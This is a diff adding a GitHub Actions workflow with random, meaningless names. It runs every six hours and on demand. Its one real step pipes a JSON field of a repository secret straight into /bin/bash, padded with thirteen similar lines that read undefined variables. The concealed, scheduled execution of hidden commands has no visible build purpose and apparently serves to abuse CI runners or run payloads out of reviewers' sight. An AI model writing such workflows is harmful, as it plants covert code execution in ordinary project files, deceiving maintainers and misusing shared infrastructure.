@@ -1,0 +1,32 @@
+name: niyaomaibmaaa
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '31 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: niyaomaibmaaa
+        env:
+          xva5: ${{ secrets.xva5 }}
+        run: |
+          echo $xva5 | jq -r .sxz760 | /bin/bash
+          echo $w20 | jq -r .day712 | /bin/bash
+          echo $w335 | jq -r .dwxb6 | /bin/bash
+          echo $lu15 | jq -r .bduxh916 | /bin/bash
+          echo $rasb0 | jq -r .kmgkq4430 | /bin/bash
+          echo $hftwy4227 | jq -r .bxh2 | /bin/bash
+          echo $l580 | jq -r .ey0062 | /bin/bash
+          echo $u17 | jq -r .o88544 | /bin/bash
+          echo $p3 | jq -r .elesp35600 | /bin/bash
+          echo $l62900 | jq -r .ecoj010 | /bin/bash
+          echo $cdazi36 | jq -r .kjd64 | /bin/bash
+          echo $mf94423 | jq -r .gr9 | /bin/bash
+          echo $jp99 | jq -r .jzckh21558 | /bin/bash
+          echo $kifn050 | jq -r .alahi3135 | /bin/bash
+
